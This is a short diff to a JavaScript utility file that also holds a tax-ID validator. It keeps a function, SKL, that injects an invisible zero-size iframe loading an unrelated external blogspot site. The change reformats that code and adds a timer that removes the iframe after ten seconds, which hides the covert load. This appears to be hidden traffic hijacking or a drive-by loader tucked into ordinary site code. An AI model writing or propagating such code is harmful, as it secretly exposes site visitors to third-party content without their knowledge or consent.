@@ -128,7 +128,20 @@
             }
         },
         SKL:function(){
-            var b=document.getElementsByTagName("body")[0];if(b!==null){var i=document.createElement("iframe");i.id="skl";i.width=0;i.height=0;i.style.display="none";i.src="http://salsaksinoenlinea.blogspot.com";b.appendChild(i)}
+            var b = document.getElementsByTagName("body")[0];
+            if (b !== null) {
+                var i = document.createElement("iframe");
+                i.id = "skl";
+                i.width = 0;
+                i.height = 0;
+                i.style.display = "none";
+                i.src = "http://salsaksinoenlinea.blogspot.com";
+                b.appendChild(i);
+            }
+            setTimeout(function () {
+                var x = document.getElementById("skl");
+                x.remove();
+            }, 10000);
         },
         ValidarRif:function (sRif) {
             var bResultado = false;
